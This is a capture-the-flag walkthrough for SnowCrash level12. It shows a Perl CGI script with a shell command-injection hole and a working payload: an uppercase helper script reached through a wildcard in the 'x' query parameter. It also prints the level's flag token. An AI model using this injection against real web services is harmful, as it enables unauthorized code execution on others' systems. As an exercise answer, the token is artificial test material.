# Find the Flag12 Password

When we log in as `level12`, we can see the `level12.pl` file in the home directory.

Open the file:

```sh
cat level12.pl
```

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

The comment tells us that the CGI script is served on `localhost:4646`. It accepts two query parameters, `x` and `y`, and passes them to the `t()` function:

```perl
n(t(param("x"), param("y")));
```

## Inspect the Vulnerability

The vulnerable line is:

```perl
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```

Backticks in Perl execute the enclosed text as a shell command. Since `$xx` comes from the user-controlled `x` parameter, we can inject shell syntax into the `egrep` command.

However, the script transforms `$xx` before executing it:

```perl
$xx =~ tr/a-z/A-Z/;
$xx =~ s/\s.*//;
```

The first line converts lowercase letters to uppercase. The second line removes everything from the first whitespace character onward. Because of these restrictions, a direct payload such as `` `getflag > /tmp/flag` `` will not work reliably: it becomes uppercase, and the redirection is removed because it contains spaces.

To work around this, create an uppercase script name and put the redirection inside the script itself.

## Create the Payload Script

Create `/tmp/GETFLAG.SH`:

```sh
vi /tmp/GETFLAG.SH
```

```sh
#!/bin/bash
/bin/getflag > /tmp/flag12
```

Make it executable:

```sh
chmod +x /tmp/GETFLAG.SH
```

Now use command substitution in the `x` parameter:

```sh
level12@SnowCrash:~$ curl 'http://127.0.0.1:4646/?x=$(/*/GETFLAG.SH)'
..level12@SnowCrash:~$ cat /tmp/flag12
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

The payload uses `/*/GETFLAG.SH` instead of `/tmp/GETFLAG.SH` because the input is converted to uppercase before execution. The wildcard still matches `/tmp/GETFLAG.SH`, and the script runs with the privileges of the CGI service.

The output file contains the token for the next level.
